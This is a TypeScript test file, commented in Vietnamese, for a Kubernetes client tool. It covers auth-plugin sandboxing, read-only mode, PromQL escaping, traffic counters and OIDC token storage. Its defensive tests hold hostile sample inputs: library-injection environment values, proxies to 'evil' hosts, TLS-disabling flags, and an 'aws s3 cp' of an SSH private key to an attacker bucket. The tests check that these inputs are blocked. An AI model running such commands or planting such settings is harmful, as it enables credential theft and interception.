import { describe, expect, it } from 'vitest'
import { parse } from 'yaml'
import { checkPluginArgs, credentialProvider, pluginEnv } from '../../session-host/auth'
import { escapeRe } from '../../session-host/prometheus'
import { accumulate, type TrafficCounters } from '../../session-host/traffic'
import { setOidcTokens } from '../../main/kubeconfig'
import { isMutating, K8sOp } from '../../shared/ops'
import { selectorMatches } from '../../shared/map'
import { parseCaretta, trafficRates, type TrafficSample } from '../../shared/traffic'
import type { LimitedSpawn } from '../../../registry/host-types'

describe('plugin xác thực (exec): kubeconfig lạ không chạy được lệnh / mã tuỳ ý', () => {
  it('chỉ giữ biến trong danh sách cho phép (hồ sơ, region, project…); bỏ nạp mã, PATH, proxy, tắt TLS', () => {
    const { env, dropped } = pluginEnv({
      AWS_PROFILE: 'prod',
      AWS_REGION: 'eu-west-1',
      LD_PRELOAD: '/tmp/x.so',
      DYLD_INSERT_LIBRARIES: '/tmp/x.dylib',
      NODE_OPTIONS: '--require /tmp/x.js',
      PYTHONSTARTUP: '/tmp/x.py',
      CLOUDSDK_PYTHON: 'python3',
      CLOUDSDK_PYTHON_ARGS: '-c "import os"',
      PERL5OPT: '-Mx',
      BASH_ENV: '/tmp/x',
      PATH: '/tmp/evil',
      'BAD-NAME': 'x',
      'A=B': 'x',
      // File cấu hình khác → credential_process / plugin chạy lệnh tuỳ ý.
      AWS_CONFIG_FILE: '/tmp/evil-config',
      AWS_SHARED_CREDENTIALS_FILE: '/tmp/evil-creds',
      AWS_DATA_PATH: '/tmp/models',
      CLOUDSDK_CONFIG: '/tmp/gcloud',
      AZURE_CONFIG_DIR: '/tmp/az',
      AZURE_EXTENSION_DIR: '/tmp/az-ext',
      BOTO_CONFIG: '/tmp/boto',
      // Chỉ trỏ tới file thông tin xác thực / CA — giữ.
      GOOGLE_APPLICATION_CREDENTIALS: '/home/u/sa.json',
      AWS_CA_BUNDLE: '/etc/ca.pem',
      // Proxy + tắt kiểm chứng chỉ → token đi qua máy kẻ tấn công; cho chạy lệnh ngoài; đổi IdP.
      HTTPS_PROXY: 'http://evil:8080',
      ALL_PROXY: 'socks5://evil:1080',
      CLOUDSDK_AUTH_DISABLE_SSL_VALIDATION: 'true',
      GOOGLE_EXTERNAL_ACCOUNT_ALLOW_EXECUTABLES: '1',
      AZURE_AUTHORITY_HOST: 'https://evil.example',
      // Chọn project / service principal — giữ.
      CLOUDSDK_CORE_PROJECT: 'my-project',
      AAD_SERVICE_PRINCIPAL_CLIENT_ID: 'id'
    })
    expect(env).toEqual({
      AWS_PROFILE: 'prod',
      AWS_REGION: 'eu-west-1',
      GOOGLE_APPLICATION_CREDENTIALS: '/home/u/sa.json',
      AWS_CA_BUNDLE: '/etc/ca.pem',
      CLOUDSDK_CORE_PROJECT: 'my-project',
      AAD_SERVICE_PRINCIPAL_CLIENT_ID: 'id'
    })
    expect(dropped).toHaveLength(23)
    expect(dropped).toContain('HTTPS_PROXY')
    expect(dropped).toContain('CLOUDSDK_AUTH_DISABLE_SSL_VALIDATION')
  })

  it('chỉ lệnh lấy token: aws eks get-token, kubelogin get-token, gcloud config config-helper', () => {
    expect(() => {
      checkPluginArgs('aws', [
        '--region',
        'us-east-1',
        'eks',
        'get-token',
        '--cluster-name',
        'c',
        '--output',
        'json'
      ])
    }).not.toThrow()
    expect(() => {
      checkPluginArgs('aws', ['s3', 'cp', '/home/me/.ssh/id_rsa', 's3://evil/'])
    }).toThrow(/not a sign-in command/)
    // "eks get-token" ở cuối không che được lệnh thật đứng trước.
    expect(() => {
      checkPluginArgs('aws', ['s3', 'cp', '/home/me/.ssh/id_rsa', 's3://evil', 'eks', 'get-token'])
    }).toThrow(/not a sign-in command/)
    expect(() => {
      checkPluginArgs('aws', ['--profile', 'p', 's3', 'cp', 'a', 'b', 'eks', 'get-token'])
    }).toThrow(/not a sign-in command/)
    // Tuỳ chọn không có giá trị đứng ngay trước lệnh con vẫn được.
    expect(() => {
      checkPluginArgs('aws', ['--debug', 'eks', 'get-token', '--cluster-name', 'c'])
    }).not.toThrow()
    expect(() => {
      checkPluginArgs('aws', ['--region=eu-west-1', 'eks', 'get-token'])
    }).not.toThrow()
    expect(() => {
      checkPluginArgs('kubelogin', ['get-token', '--login', 'azurecli', '--server-id', 'x'])
    }).not.toThrow()
    expect(() => {
      checkPluginArgs('kubelogin', ['convert-kubeconfig'])
    }).toThrow()
    expect(() => {
      checkPluginArgs('gcloud', ['config', 'config-helper', '--format=json'])
    }).not.toThrow()
    expect(() => {
      checkPluginArgs('gcloud', ['compute', 'ssh', 'vm'])
    }).toThrow()
    expect(() => {
      checkPluginArgs('gke-gcloud-auth-plugin', [])
    }).not.toThrow()
    // Đổi nơi gửi thông tin xác thực / tắt TLS / nạp tuỳ chọn từ file: ở đâu cũng bị chặn.
    for (const [binary, args] of [
      ['aws', ['--endpoint-url', 'https://evil', 'eks', 'get-token']],
      ['aws', ['eks', 'get-token', '--no-verify-ssl']],
      ['aws', ['eks', 'get-token', '--ca-bundle=/tmp/ca.pem']],
      ['gcloud', ['--flags-file=/tmp/f.yaml', 'config', 'config-helper']],
      ['kubelogin', ['get-token', '--authority-host', 'https://evil']]
    ] as const)
      expect(() => {
        checkPluginArgs(binary, args)
      }).toThrow(/does not allow/)
  })

  it('credentialProvider không chạy plugin khi đối số không phải lệnh lấy token; env đã lọc', async () => {
    const calls: Record<string, string>[] = []
    const spawn: LimitedSpawn = {
      available: () => true,
      spawn: () => Promise.reject(new Error('x')),
      openPty: () => Promise.reject(new Error('x')),
      exec: (_b, _a, o) => {
        calls.push(o?.env ?? {})
        return Promise.resolve({
          code: 0,
          stderr: '',
          stdout: JSON.stringify({ status: { token: 't' } })
        })
      }
    }
    const bad = credentialProvider(
      { exec: { command: 'aws', args: ['s3', 'ls'], env: {}, apiVersion: 'v1' } },
      spawn,
      'https://x'
    )
    await expect(bad(false)).rejects.toThrow(/not a sign-in command/)
    expect(calls).toHaveLength(0)
    const logs: string[] = []
    const ok = credentialProvider(
      {
        exec: {
          command: 'aws',
          args: ['eks', 'get-token'],
          env: { AWS_PROFILE: 'p', LD_PRELOAD: 'x' },
          apiVersion: 'v1'
        }
      },
      spawn,
      'https://x',
      Date.now,
      { log: (m) => logs.push(m) }
    )
    await Promise.all([ok(false), ok(false), ok(false)])
    // Ba request cùng lúc → chạy plugin một lần.
    expect(calls).toHaveLength(1)
    expect(Object.keys(calls[0] ?? {}).sort()).toEqual(['AWS_PROFILE', 'KUBERNETES_EXEC_INFO'])
    expect(logs[0]).toMatch(/LD_PRELOAD/)
  })
})

describe('chế độ chỉ đọc', () => {
  it('chặn cả port-forward (mở đường vào cluster); xem Secret vẫn được', () => {
    const op = (raw: unknown): K8sOp => K8sOp.parse(raw)
    expect(
      isMutating(op({ op: 'portForward', namespace: 'a', target: 'pod/x', ports: [[0, 80]] }))
    ).toBe(true)
    expect(isMutating(op({ op: 'portForward.resume', id: 'x' }))).toBe(true)
    expect(isMutating(op({ op: 'portForward.stop', id: 'x' }))).toBe(false)
    expect(isMutating(op({ op: 'secret.reveal', namespace: 'a', name: 'x', key: 'k' }))).toBe(false)
    expect(isMutating(op({ op: 'drain', node: 'n', force: true }))).toBe(true)
  })
})

describe('Prometheus', () => {
  it('tên pod trong regex PromQL: gạch chéo ngược viết đôi trong chuỗi', () => {
    expect(escapeRe('web-1.a')).toBe('web-1\\\\.a')
    // Chuỗi PromQL "web-1\\.a" → regex web-1\.a → khớp đúng dấu chấm.
    const promString = JSON.parse(`"${escapeRe('web-1.a')}"`) as string
    expect(new RegExp(`^${promString}$`).test('web-1.a')).toBe(true)
    expect(new RegExp(`^${promString}$`).test('web-1xa')).toBe(false)
  })
})

describe('traffic Caretta: tổng tích luỹ theo agent', () => {
  const line = (bytes: number, role = '1', server = 'db'): string =>
    `caretta_links_observed{client_kind="Deployment",client_name="web",client_namespace="shop",server_kind="Deployment",server_name="${server}",server_namespace="shop",server_port="5432",role="${role}"} ${bytes}`
  const read = (agent: string, ...lines: string[]) => ({
    agent,
    rows: parseCaretta(lines.join('\n'))
  })
  const sample = (at: number, links: ReturnType<typeof accumulate>): TrafficSample => ({
    status: 'ok',
    at,
    agents: 2,
    links
  })

  it('agent không trả lời một lượt → không tụt rồi vọt (không có tốc độ ảo)', () => {
    const c: TrafficCounters = { agents: new Map(), acc: new Map() }
    const s1 = sample(0, accumulate(c, [read('a', line(1000)), read('b', line(5000))], 0))
    expect(s1.links[0]?.bytes).toBe(6000)
    // b không trả lời: chỉ phần tăng của a được cộng.
    const s2 = sample(10_000, accumulate(c, [read('a', line(2000))], 10_000))
    // b trả lời lại (tăng 1000 trong 20 s).
    const s3 = sample(20_000, accumulate(c, [read('a', line(3000)), read('b', line(6000))], 20_000))
    expect(trafficRates(s1, s2)[0]?.rate).toBe(100)
    expect(trafficRates(s2, s3)[0]?.rate).toBe(200)
    expect(trafficRates(s1, s3)[0]?.rate).toBe(150)
  })

  it('agent khởi động lại (bộ đếm về 0) → cộng giá trị mới; agent mới về sau chỉ lấy mốc', () => {
    const c: TrafficCounters = { agents: new Map(), acc: new Map() }
    accumulate(c, [read('a', line(10_000))], 0)
    const after = accumulate(c, [read('a', line(500))], 1000)
    expect(after[0]?.bytes).toBe(10_500)
    // Agent c xuất hiện với cả lịch sử 1 GB: không cộng một lần.
    const joined = accumulate(c, [read('a', line(600)), read('c', line(1e9))], 2000)
    expect(joined[0]?.bytes).toBe(10_600)
    const next = accumulate(c, [read('a', line(600)), read('c', line(1e9 + 400))], 3000)
    expect(next[0]?.bytes).toBe(11_000)
  })

  it('cùng kết nối thấy ở hai phía (client / server) → lấy phía lớn hơn, không cộng', () => {
    const c: TrafficCounters = { agents: new Map(), acc: new Map() }
    const links = accumulate(c, [read('a', line(1000, '1')), read('b', line(980, '2'))], 0)
    expect(links).toHaveLength(1)
    expect(links[0]?.bytes).toBe(1000)
  })
})

describe('bản đồ: selector, phạm vi ảnh hưởng', () => {
  it('nhãn trùng tên thuộc tính Object ("constructor") không bị coi là có', () => {
    expect(
      selectorMatches({ matchExpressions: [{ key: 'constructor', operator: 'Exists' }] }, {})
    ).toBe(false)
    expect(
      selectorMatches({ matchExpressions: [{ key: 'toString', operator: 'DoesNotExist' }] }, {})
    ).toBe(true)
  })
})

describe('kubeconfig: lưu token OIDC đã làm mới', () => {
  const yaml = `apiVersion: v1
# ghi chú giữ nguyên
contexts:
  - name: dev
    context: { cluster: c, user: alice }
users:
  - name: alice
    user:
      auth-provider:
        name: oidc
        config:
          id-token: old
          refresh-token: rt-1
          idp-issuer-url: https://idp
  - name: bob
    user: { token: t }
`
  it('ghi id-token / refresh-token mới vào đúng user của context; context không dùng OIDC → null', () => {
    const next = setOidcTokens(yaml, 'dev', { idToken: 'new', refreshToken: 'rt-2' })
    expect(next).toContain('# ghi chú giữ nguyên')
    const doc = parse(next ?? '') as {
      users: { name: string; user: { 'auth-provider'?: { config: Record<string, string> } } }[]
    }
    expect(doc.users[0]?.user['auth-provider']?.config).toMatchObject({
      'id-token': 'new',
      'refresh-token': 'rt-2',
      'idp-issuer-url': 'https://idp'
    })
    expect(setOidcTokens(yaml.replace('user: alice', 'user: bob'), 'dev', { idToken: 'x' })).toBe(
      null
    )
  })
})
